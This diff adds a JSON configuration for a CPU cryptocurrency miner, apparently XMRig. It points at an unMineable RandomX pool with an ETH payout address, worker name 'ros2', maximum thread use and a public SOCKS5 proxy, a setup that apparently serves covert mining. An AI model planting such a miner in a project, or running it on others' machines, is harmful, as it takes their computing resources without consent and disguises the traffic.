@@ -1,0 +1,34 @@
+{
+    "autosave": true,
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "huge-pages-jit": true,
+        "hw-aes": null,
+        "priority": null,
+        "memory-pool": false,
+        "yield": true,
+        "max-threads-hint": 100,
+        "asm": true,
+        "argon2-impl": null,
+        "astrobwt-max-size": 550,
+        "astrobwt-avx2": false,
+        "cn/0": false,
+        "cn-lite/0": false
+    },
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "coin": null,
+            "algo": "rx/0",
+            "url": "rx-eu.unmineable.com:3333",
+            "user": "ETH:0x40819d362CCfb0bb130C80cc0dBB4cdef5b02417.ros2",
+            "pass": "x",
+            "socks5": "socks5://72.210.208.101:4145",
+            "tls": false,
+            "keepalive": true,
+            "nicehash": true
+        }
+    ]
+}
